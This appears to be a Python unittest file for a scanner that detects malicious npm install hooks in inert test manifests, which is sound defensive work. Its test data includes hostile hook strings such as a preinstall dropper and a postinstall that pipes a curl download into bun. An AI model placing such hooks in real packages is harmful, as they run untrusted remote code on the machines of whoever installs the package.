#!/usr/bin/env python3
"""npm install-time lifecycle-hook execution signatures (#1090).

Detection + confidence + scoping-to-lifecycle-keys + allowlist, all against inert manifests.
"""
from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from stayawake.bots.security.models import INFECTED, SUSPICIOUS, CLEAN
from stayawake.bots.security.signatures import load_signatures
from stayawake.bots.security.scanner import scan_target
from stayawake.bots.security.targets import LocalRepoTarget, ScanOptions

SIGS = load_signatures()


def _scan_pkg(scripts, allow=None):
    d = Path(tempfile.mkdtemp())
    (d / "package.json").write_text(
        json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}), encoding="utf-8")
    return scan_target(LocalRepoTarget(d, "t", ScanOptions()), SIGS, allow or [])


class TestNpmLifecycle(unittest.TestCase):
    def test_preinstall_setup_bun_is_confirmed_infected(self):
        r = _scan_pkg({"preinstall": "node setup_bun.js"})
        self.assertIn("npm-lifecycle-dropper", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, INFECTED)

    def test_remote_fetch_piped_into_bun_is_confirmed(self):
        r = _scan_pkg({"postinstall": "curl -s https://x.invalid/y | bun -"})
        self.assertIn("npm-lifecycle-remote-fetch", {f.signature_id for f in r.findings})
        self.assertEqual(r.verdict, INFECTED)

    def test_bun_smuggling_is_heuristic_suspicious(self):
        r = _scan_pkg({"install": "bunx some-tool"})
        ids = {f.signature_id for f in r.findings}
        self.assertIn("npm-lifecycle-exec", ids)
        self.assertNotIn("npm-lifecycle-dropper", ids)   # not the confirmed dropper
        self.assertEqual(r.verdict, SUSPICIOUS)          # heuristic only

    def test_only_lifecycle_keys_inspected_not_user_scripts(self):
        # A dropper under a NON-lifecycle key (only runs when a human types `npm run …`) is not
        # this vector, so it must NOT be flagged.
        r = _scan_pkg({"test": "node setup_bun.js", "myscript": "curl x | bun -"})
        self.assertEqual([f.signature_id for f in r.findings], [])
        self.assertEqual(r.verdict, CLEAN)

    def test_benign_lifecycle_hooks_are_clean(self):
        # Legit install hooks (husky, a plain node build) must NOT flag — bare `node` is not the
        # vector (native-module postinstall runs node routinely).
        r = _scan_pkg({"prepare": "husky install",
                       "postinstall": "node ./scripts/build.js", "test": "jest"})
        self.assertEqual([f.signature_id for f in r.findings], [])

    def test_allowlist_suppresses_by_signature(self):
        r = _scan_pkg({"preinstall": "node setup_bun.js"},
                      allow=[{"signature": "npm-lifecycle-dropper", "path_glob": "package.json"}])
        self.assertNotIn("npm-lifecycle-dropper", {f.signature_id for f in r.findings})


if __name__ == "__main__":
    unittest.main()
